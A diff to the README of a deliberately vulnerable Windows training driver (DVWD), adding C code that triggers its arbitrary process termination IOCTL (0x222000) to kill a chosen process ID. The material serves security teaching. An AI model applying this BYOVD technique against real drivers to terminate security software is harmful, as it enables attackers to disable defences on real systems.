@@ -71,6 +71,26 @@ Bring-your-own-vulnerable-driver (BYOVD) attacks exploit vulnerabilities in sign
 <p align="right"><a href="#damn-vulnerable-windows-driver-dvwd">back to top</a></p>
 An arbitrary process termination vulnerability exposes an unauthenticated IOCTL that takes a process ID (PID) as an argument and has a source code path, at the end of which it passes the PID to a Windows process termination API, such az `ZwTerminateProcess`.
 
+The exposed IOCTL is invoked via the symbolic link `\\.\DVWD_WDM` and the IOCTL code 0x222000:
+
+```
+HANDLE hDevice = INVALID_HANDLE_VALUE;
+DWORD bytesReturned = 0;
+
+hDevice = CreateFileW(L"\\\\.\\DVWD_WDM", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+if (hDevice == INVALID_HANDLE_VALUE) {
+    printf("[-] Failed to open a handle to the driver. Error: %lu\n", GetLastError());
+    return;
+}
+
+// Send the IOCTL with the 64-bit process ID
+BOOL ret = DeviceIoControl(hDevice, 0x222000, &targetPid, sizeof(targetPid), NULL, 0, &bytesReturned, NULL);
+if (!ret)
+    printf("[-] Driver IOCTL failed. Error: %lu\n", GetLastError());
+
+CloseHandle(hDevice);
+```
+
 ### Arbitrary Memory Read
 <p align="right"><a href="#damn-vulnerable-windows-driver-dvwd">back to top</a></p>
 An arbitrary memory read vulnerability exposes an unauthenticated IOCTL that allows user processes to read arbitrary memory locations.
